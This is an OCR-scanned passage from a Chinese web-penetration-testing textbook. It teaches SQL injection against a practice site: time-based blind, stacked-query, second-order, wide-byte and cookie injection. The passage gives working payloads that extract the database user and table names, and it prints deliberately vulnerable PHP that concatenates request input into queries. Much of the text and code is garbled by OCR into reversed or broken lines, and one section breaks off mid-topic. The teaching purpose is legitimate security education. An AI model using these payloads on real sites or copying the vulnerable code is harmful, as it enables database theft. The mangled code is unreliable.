$row = mysqli_fetch_array($result);
if ($row){
exit(°yes);
Jelse{
exit(*no");
此处仍然可以用Boolean盲注或其他注入方法，下面用时间注入演示。当访间id=1
and if(ord(substring(userO,1,1))=114,sleep(3),1)%23时，执行的SQL语句为：
select * from users where ^id’ =′1* and if(ord(substring(user(),1,1))=114, sleep
(3),1)%23
由于userO为root，root第一个字符r的ASCII值是114，所以SQL语句中if条件成立，
执行sleep(3），页面会延迟3s，通过这种延迟即可判断SQL语句的执行结果。
4.2.3堆叠查询注入攻击
堆叠查询注入攻击的测试地址：http://www.ccctf.cn/dd.php?id=1.
堆叠查询可以执行多条语句，多语句之间以分号隔开。堆叠查询注入就是利用
这个特点，在第二个SQL语句中构造自已要执行的语句。首先访问id=1，页面返回
MySQL错误，再访问id-1%23，页面返回正常结果。这里可以使用Boolean注入、时
间注入，也可以使用另外一种注入方式一—堆叠注入。
堆叠注入的语句为：
;select if(substr(user(),1,1)=r′,s1eep(3),1)%23
从堆叠注入语句中可以看到，第二条SQL语句（sclectif(substr（userO,1,1)
=r,sleep(3),1)%23）就是时间盲注的语句，执行结果如图4-38所示。
---
## Page 130
第4章Web安全原理制析111
图4-38利用维叠注入获取数据
后面获取数据的操作与时间注入的一样，通过构造不同的时间注入语句，可以
得到完整的数据库的库名、表名、字段名和具体数据。执行以下语句，就可以获取
数据库的表名，
'′;select if(substr((select table_name from information_schena.tables where
table_schema=database() 1imit 0,1),1,1)=′e′,s1eep(3),1)%23
结果如图4-39所示。
图4-39利用堆叠注入获取表名
---
## Page 131
112Web安全政防：渗透测试实战指南
4.2.4堆叠查询注入代码分析
在堆叠注入页面中，程序获取GET参数ID，使用PDO的方式进行数据查询，但
仍然将参数ID拼接到查询语句，导致PDO没起到预编译的效果，程序仍然存在SQL
注入漏洞，代码如下所示。
?php
try{
$conn = new Pp0(*mysq1:host=1ocalhost;dbname=test", “root”, “123456°);
$conn- >SetAttribute(PDO: :ATTR_ERRMODE, PDO: :ERRMODE_EXCEPTION) ;
(. *[.pr, ]a“$ * ., = PT. auaqn suasn wous ▪ 13n3s,)uanbsetFetchMode(PDo: :FETCH_ASSOC);
foreach($stmt->fetchA11() as Sk=>Sv) {
foreach (Sv as Skey => $value) {
echo $value;
)
$dsn = nu11;
catch(PDoException $e)
L
echo *error";
Sconn = nul1;
?>
使用PDO执行SQL语句时，可以执行多语句，不过这样通常不能直接得到注入结
果，因为PDO只会返回第一条SQL语句执行的结果，所以在第二条语句中可以用
update更新数据或者使用时间盲注获取数据。访间dd.php?id=l;select if(ord(substring
(userO,1,1))=114,sleep(3),1);%23时，执行的SQL语句为：
aas=((t(as)usns)o) aas,t. = , au sas wos  133
#(T(E)
此时SQL语句分为了两条，第一条SELECT*FROMusers whereid=‘1'是代码
自己的select查询，而select if（ord（substring（userO,1,1))=114,sleep(3）,1);#则是我们构造
的时间盲注的语句。
---
## Page 132
第4章Web安全原理剖析113
4.2.5二次注入攻击
二次注入攻击的测试地址：http:/www.ccctf.cn/er/1.php？usemame=test 和
http:/www.ccctf.cn/er/2.php?id=10。其中，1.php页面的功能是注册用户名，也是插入
第一步，访间1.php?usemame=test，如图4-40所示。
0.121
everig
cs/l;q*l-3,*/*
2-L05
董 s4 为+ 21L
per
图4-40注册用户名test
从页面返回结果可以看到用户名tesr对应的ID为21，访间2.php？id=21，结果如图
4-41所示。
图4-41访问test'的信息
从返回结果可以看到服务端返回了MySQL的错误（多了一个单引号引起的语法
错误），这时回到第一步，先访问1.php?usermame-test'order by 1%23，获取一个新的
id=32，当再次访问2.php?id=32时，页面返回空白：再次尝试，访问1.php?usermame=test
orderby 10%23，获取一个新的id=33，当再访间2.php?id=33时，页面返回错误信息
（Unknown column‘10in‘order clause'），如图4-42所示。这说明空白页面就是正常返
回，通过不断的尝试，笔者判断出数据库表中一共有3个字段。访问1.php?usermame
=testunion select1,2,3%23，获取一个新id=39，再访问2.php?id=39，发现页面返回了
union select中的2和3字段，结果如图4-43所示。
---
## Page 133
114Web安全文防：渗进测试实战指南
06
Dee 2017 09:23+56 ot
tsl: charset=9TF-B
9rmwg2 29p2s, #F ,0t, wm[eo s50
图4-42访问orderby10的结果
0.121
/3.4.
Rf-4
sf-tn/er/
图4-43使用Union语句的结果
在2或3的位置，插入我们的语句，比如访问1.php?id=testunion select 1,userO，3%23，
获得新的id=40，再访间2.php?id=40，得到userO的结果，如图4-44所示，使用此方法
就可以获取数据库中的数据。
s cs9 418t 0 302 990
图4-44利用二次注入获取数据
4.2.6二次注入代码分析
二次注入中1.php页面的代码如下所示，实现了简单的用户注册功能，程序获取到
GET参数usermame和参数password，然后将usemame和password拼接到SQL语句，使用
insert语句插入数据库中。由于参数usemame使用addslashes进行转义（转义了单引号，
导致单引号无法闭合），参数password进行了MD5哈希，所以此处不存在SQL注入漏
洞。
c?php
$con=mysqli_connect(“localhost","root","root","sql");
---
## Page 134
第4章Web安全原理划析4115
1f (mysqli_connect_errno())
echo“连接失败：.mysqli_connect_error(）;
$username = $_GET['usernane′];
1
$password = $_GET['password′];
$result = mysqli_query($con, “insert into users(* username′ ,*password’ ) values
(*",addslashes($username) .**,*",md5($password) .**)°);
(）asubs P 。oa
?>
当访问usermame=test&password=123456时，执行的SQL语句为：
insert into users(^username’,*password') values (*test\**,
‘e1eadc3949ba59abbe56e857f2ef883e′).
从图4-45中的数据库里可以看到，插入的用户名是test'。
username
password
email
address
admin
e10adc3949ba59abbe56e057f20f883e 1@1.com123123
test'
e10adc3949ba59abbe56e057f20f883e
图4-45插入到数据库中的数据
在二次注入中，2.php中的代码如下所示，首先将GET参数ID转成int类型（防止
拼接到SQL语句时，存在SQL注入漏洞），然后到users表中获取ID对应的usemame，
接着到person表中查询usermame对应的数据。
。* bsg*。 : st Suuas Kuan au_ oua
?>
当访间id=1时，执行的SQL语句为：
SELECT * FROM users KHERE id=′1\**
可以看到单引号被转义符“\”转义，所以在一般情况下，是无法注入的，但由
于在数据库查询前执行了SETNAMES'GBK'，将编码设置为宽字节GBK，所以此处
存在宽字节注入漏洞。
在PHP中，通过iconvO进行编码转换时，也可能存在宽字符注入漏洞。
4.2.9cookie注入攻击
cookie注入攻击测试地址：http:/www.ccctf.cn/cookie.php。
发现URL中没有GET参数，但是页面返回正常，使用BurpSuite抓取数据包，发
现cookie中存在id=1的参数，如图4-56所示。
overe
Heep-al1e: tinoot=5, saz1.00
th1 15
图4-56cookie数据
修改cookie中的id-1为id-1，然后再次访问该URL，发现页面返回错误。接下来，
分别修改cookie中id=1为id=1 and 1=1和id=1and1=2，再次访间，判断该页面是否存
在SQL注入漏洞，返回结果如图4-57和图4-58所示，得出cookie中的参数ID存在SQL
注入的结论。
---
## Page 140
第4章Web安全原理剖析121
74.15
len/x81:g*0,1,*/
图4-57访问id=1and 1=1的结果
dET/e00kie.pbp w711
4,15
ae criszrst ctot oed
etal,atis/zami,ple
n/xal1g=0,5,*/*
es-e 1
图4-58访问id=1and1=2的结果
接着使用orderby查询字段，使用Union注入方法完成此次注入。
4.2.10cookie注入代码分析
通过S_COOKIE能获取浏览器cookie中的数据，在cookie注入页面中程序通过
S_COOKIE获取参数ID，然后直接将ID拼接到select语句中进行查询，如果有结果，
则将结果输出到页面，代码如下所示。